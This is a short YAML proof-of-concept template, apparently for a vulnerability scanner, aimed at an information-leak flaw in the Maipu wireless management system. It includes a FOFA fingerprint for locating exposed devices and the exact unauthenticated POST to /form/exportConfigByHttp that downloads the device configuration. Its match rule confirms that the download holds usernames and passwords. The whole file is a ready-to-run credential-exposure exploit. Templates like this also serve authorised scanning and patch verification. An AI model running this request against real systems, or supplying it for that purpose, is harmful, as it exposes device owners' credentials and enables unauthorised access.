id: poc-yaml-maipu-webs-exportconfigbyhttp-info-leak
info:
  name: 迈普无线管理系统 exportConfigByHttp 信息泄露漏洞
  severity: medium
  tags:
  - 信息泄露
  finger: 迈普无线管理系统
  fofa: header="Maipu-Webs"
requests:
- method: POST
  path: /form/exportConfigByHttp
  headers:
    Content-Type: application/x-www-form-urlencoded
  data: Download_config=%E5%AF%BC%E5%87%BA
  expression: status_code == 200 && contains(body,"user") && contains(body,"password")
    && contains(content_type,"application/octet-stream") && contains(headers,"filename=")
    && !contains(body,"<")
variables: {}
transport: http
